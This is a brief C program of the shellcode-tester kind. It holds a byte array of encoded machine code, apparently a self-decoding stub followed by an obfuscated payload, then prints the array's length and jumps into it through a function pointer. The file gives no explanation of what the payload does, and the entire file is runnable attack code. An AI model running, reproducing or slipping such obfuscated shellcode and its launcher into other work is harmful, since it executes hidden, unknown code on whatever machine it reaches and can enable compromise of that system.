#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xfc\xbb\xc7\x17\x47\xad\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"                                                                                                                                                                        "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf6\xd7\x76\x76\xc9"                                                                                                                                                                        "\x1e\x49\x5a\x79\xc9\x85\x75\x0a\x61\xb2\xa6\x8e\x18\x2c\x30"                                                                                                                                                                        "\xad\x8b\xe3\xcb\xd0\x9c\x0f\x01\x92\xec\xcf\xd9\xa3\xd5\x1d"                                                                                                                                                                        "\x59\xc3\xe9\x9d\x5a";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
